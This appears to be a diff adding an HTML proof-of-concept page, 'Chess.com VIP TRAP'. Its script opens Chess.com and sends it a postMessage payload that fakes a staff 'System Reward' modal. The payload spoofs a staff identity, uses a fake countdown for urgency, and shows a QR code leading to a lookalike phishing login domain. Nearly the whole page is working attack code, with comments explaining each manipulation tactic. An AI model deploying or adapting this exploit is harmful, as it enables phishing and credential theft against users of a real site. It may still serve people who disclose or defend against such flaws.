@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Chess.com VIP TRAP</title>
+    <style>
+        body { 
+            background-color: #1e1e1e; 
+            color: #00ff41; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            display: flex; 
+            flex-direction: column;
+            align-items: center; 
+            justify-content: center; 
+            height: 100vh; 
+            margin: 0; 
+        }
+        .card { 
+            background: #262421; 
+            padding: 40px; 
+            border-top: 5px solid #00ff41; 
+            border-radius: 8px; 
+            box-shadow: 0 20px 50px rgba(0,0,0,0.5); 
+            text-align: center;
+            width: 400px;
+        }
+        h2 { color: #fff; margin-top: 0; }
+        .desc { color: #aaa; font-size: 14px; margin-bottom: 20px; }
+        
+        button { 
+            background: linear-gradient(to bottom, #81b64c, #45632a); 
+            color: white; 
+            border: none; 
+            padding: 15px 30px; 
+            font-size: 18px; 
+            border-radius: 5px; 
+            cursor: pointer; 
+            font-weight: bold; 
+            box-shadow: 0 5px #2e421c;
+            transition: 0.1s;
+            width: 100%;
+        }
+        button:active { transform: translateY(4px); box-shadow: 0 1px #2e421c; }
+        
+        .log { margin-top: 15px; color: #7fa650; font-family: monospace; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h2>💎 Diamond Membership Trap</h2>
+    <p class="desc">Injects a spoofed "System Reward" modal with a malicious QR code into the victim's session.</p>
+    
+    <button onclick="deployTrap()">🎁 SEND FAKE REWARD</button>
+    
+    <div id="status" class="log">Waiting for victim...</div>
+</div>
+
+<script>
+    function deployTrap() {
+        const status = document.getElementById('status');
+        status.innerText = ">> Target Launched...";
+        
+        // 1. Open Chess.com Home
+        const target = window.open('https://www.chess.com/home', '_blank');
+
+        // 2. The Phishing Payload
+        // We link the QR code to a fake login page (Simulation)
+        const phishLink = "https://chess.com-login-secure.support/claim-diamond"; 
+        const qrImage = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(phishLink)}&color=000000&bgcolor=ffffff`;
+
+        // 3. Delay to ensure page load
+        setTimeout(() => {
+            status.innerText = ">> INJECTING MALICIOUS MODAL...";
+            
+            const trapPayload = {
+                event: "SHOW_MESSAGE_MODAL", 
+                user: {
+                    // SPOOFING: Create ultimate trust
+                    userId: 41, // Danny Rensch ID (Trust)
+                    isStaff: true, // Red Staff Shield
+                    isDiamond: true, // Diamond Icon
+                    isOnline: true, // Green Dot
+                    
+                    // THE HOOK:
+                    name: "🎉 SYSTEM REWARD: 1 YEAR FREE", 
+                    
+                    // THE INSTRUCTION (Hijacking username field):
+                    username: "Scan_QR_Below_To_Claim", 
+                    
+                    // THE URGENCY (Hijacking country field):
+                    country: { code: "US", name: "⚠️ Expires in 02:59" },
+                    
+                    // THE WEAPON (QR Code as Avatar):
+                    avatar_url: qrImage
+                }
+            };
+
+            // Send twice to ensure it pops up over anything else
+            target.postMessage(trapPayload, '*');
+            setTimeout(() => target.postMessage(trapPayload, '*'), 800);
+            
+            status.innerText = ">> ✅ TRAP SUCCESSFUL";
+            status.style.color = "#00ff41";
+            
+        }, 3500);
+    }
+</script>
+
+</body>
+</html>
